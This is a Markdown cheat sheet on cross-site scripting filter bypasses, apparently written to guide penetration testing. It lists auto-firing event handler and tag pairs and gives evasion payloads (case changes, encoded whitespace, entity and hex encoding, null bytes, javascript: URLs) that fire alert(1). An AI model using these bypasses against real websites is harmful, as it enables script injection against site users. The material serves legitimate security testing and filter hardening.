# Event Handler Alternatives

## ⚠️ CRITICAL: How to Use This File

**This file contains PATTERNS to understand, NOT a list of handlers to try blindly.**

**Before using any handler:**
1. First test filter logic with "invalid variant" test (e.g., `onabc`)
2. Determine: Is it a blacklist of known handlers OR blocking all `on*` patterns?
3. Filter handlers based on what you know is blocked
4. Understand WHY alternatives work, then build YOUR payload

**Stop Conditions:**
- If `onabc` (fake handler) is blocked → ALL `on*` handlers are blocked, use javascript: protocol instead
- After 3-4 handler alternatives fail → move to different approach (protocol handlers, different tags)
- After exhausting handlers → document and try non-handler execution methods

---

## Understanding Handler Filtering

Before selecting handlers, determine filter type:

**Test with fake handler:** `onabc`
- If `onabc` ALLOWED → Filter uses **blacklist** of known handlers → try uncommon handlers below
- If `onabc` BLOCKED → Filter blocks **all** `on*` patterns → skip this file, use javascript: protocol

---

## Auto-Fire Handlers (No User Interaction)

### Error Handlers
```
onerror          - Fires when resource fails to load
```
**Use with:** `<img src=x>`, `<video src=x>`, `<audio src=x>`, `<object data=x>`

### Load Handlers  
```
onload           - Fires when element loads
```
**Use with:** `<svg>`, `<body>`, `<img src=valid>`

### Focus Handlers (with autofocus)
```
onfocus          - Fires when element gains focus
onblur           - Fires when element loses focus (need two elements)
```
**Use with:** `<input autofocus>`, `<select autofocus>`, `<textarea autofocus>`

### Toggle/State Handlers
```
ontoggle         - Fires when details element toggles
```
**Use with:** `<details open>`

### Animation Handlers
```
onanimationend   - Fires when CSS animation ends
onanimationstart - Fires when CSS animation starts
ontransitionend  - Fires when CSS transition ends
```
**Use with:** Elements with CSS animations/transitions applied

### Media Handlers
```
oncanplay        - Media can start playing
onloadeddata     - Media data loaded
onloadedmetadata - Media metadata loaded
```
**Use with:** `<video>`, `<audio>` with src

### Less Common Auto-Fire
```
onbegin          - SVG animation begins
```
**Use with:** `<svg><animate onbegin=...>`

---

## User Interaction Handlers

### Mouse Handlers
```
onclick          - Single click
ondblclick       - Double click
onmousedown      - Mouse button pressed
onmouseup        - Mouse button released
onmouseover      - Mouse enters element
onmouseout       - Mouse leaves element
onmousemove      - Mouse moves over element
onmouseenter     - Mouse enters (doesn't bubble)
onmouseleave     - Mouse leaves (doesn't bubble)
oncontextmenu    - Right-click
```

### Keyboard Handlers
```
onkeydown        - Key pressed
onkeyup          - Key released
onkeypress       - Key pressed (deprecated)
```

### Focus Handlers (without autofocus)
```
onfocus          - Element gains focus
onblur           - Element loses focus
onfocusin        - About to gain focus
onfocusout       - About to lose focus
```

### Form Handlers
```
onsubmit         - Form submitted
onreset          - Form reset
onchange         - Value changed
oninput          - Input received
oninvalid        - Validation failed
onselect         - Text selected
```

### Drag Handlers
```
ondrag           - Being dragged
ondragstart      - Drag starts
ondragend        - Drag ends
ondragenter      - Enters drop target
ondragleave      - Leaves drop target
ondragover       - Over drop target
ondrop           - Dropped
```

### Touch Handlers (Mobile)
```
ontouchstart     - Touch begins
ontouchend       - Touch ends
ontouchmove      - Touch moves
ontouchcancel    - Touch interrupted
```

### Pointer Handlers (Modern)
```
onpointerdown    - Pointer pressed
onpointerup      - Pointer released
onpointermove    - Pointer moves
onpointerover    - Pointer enters
onpointerout     - Pointer leaves
onpointerenter   - Pointer enters (no bubble)
onpointerleave   - Pointer leaves (no bubble)
```

---

## Rarely Filtered Handlers

These are less common and often missed by blacklists:

### Pointer Events (Modern, often missed)
```
onpointerenter
onpointerleave
onpointerover
onpointerout
onpointerdown
onpointerup
```

### Animation Events
```
onanimationstart
onanimationend
onanimationiteration
ontransitionend
ontransitionstart
ontransitionrun
ontransitioncancel
```

### Wheel/Scroll
```
onwheel
onscroll
```

### Clipboard
```
oncopy
oncut
onpaste
```

### Media (Less Common)
```
oncanplaythrough
ondurationchange
onemptied
onended
onpause
onplay
onplaying
onprogress
onratechange
onseeked
onseeking
onstalled
onsuspend
ontimeupdate
onvolumechange
onwaiting
```

### Miscellaneous
```
onshow           - Context menu shown
oninvalid        - Form validation failed
onsearch         - Search input (webkit)
onmessage        - Message received
onoffline        - Browser offline
ononline         - Browser online
onhashchange     - URL hash changed
onpopstate       - History navigation
onstorage        - Storage changed
```

---

## Bypassing Handler Filters

### Case Variations
```
ONMOUSEOVER
OnMouseOver
oNmOuSeOvEr
```

### Whitespace Insertion
```
onmouseover%09=alert(1)     (tab)
onmouseover%0a=alert(1)     (newline)
onmouseover%0d=alert(1)     (carriage return)
onmouseover%20=alert(1)     (space - if filter expects =)
```

### Prefix/Suffix
```
/onmouseover=alert(1)
onmouseover/=alert(1)
```

### Encoding in Handler Name
```
on&#109;ouseover=alert(1)   (HTML entity)
on\x6douseover=alert(1)     (hex escape - JS context)
```

### Null Byte
```
on%00mouseover=alert(1)
onmouse%00over=alert(1)
```

---

## Handler + Tag Combinations

### Best Auto-Fire Combinations
| Handler | Tag | Notes |
|---------|-----|-------|
| `onerror` | `<img src=x>` | Most reliable |
| `onload` | `<svg>` | Clean, short |
| `onfocus` | `<input autofocus>` | Needs autofocus |
| `ontoggle` | `<details open>` | Less filtered |
| `onbegin` | `<svg><animate>` | SVG context |

### Interaction-Based Combinations
| Handler | Tag | Interaction |
|---------|-----|-------------|
| `onclick` | `<div>click</div>` | Click |
| `onmouseover` | `<div>hover</div>` | Hover |
| `onfocus` | `<input>` | Tab/click |
| `onpointerenter` | `<div>hover</div>` | Hover (modern) |

---

## Quick Selection by Filter Type

### If Common Handlers Blocked (onerror, onload, onclick, onmouseover)
Try: `onpointerenter`, `ontoggle`, `onanimationend`, `onfocusin`, `onauxclick`

### If All `on*` Pattern Blocked
Try: `href=javascript:` or `src=javascript:` (not event handlers)

### If Specific Characters in Handler Blocked
Map which characters are blocked and find handlers without them.

---

## Quick Selection by Filter Type

### If Common Handlers Blocked (onerror, onload, onclick, onmouseover)
And `onabc` is ALLOWED (blacklist filter):
Try: `onpointerenter`, `ontoggle`, `onanimationend`, `onfocusin`, `onauxclick`

### If All `on*` Pattern Blocked
(`onabc` is also blocked):
Skip handlers entirely. Use: `href=javascript:` or `src=javascript:`
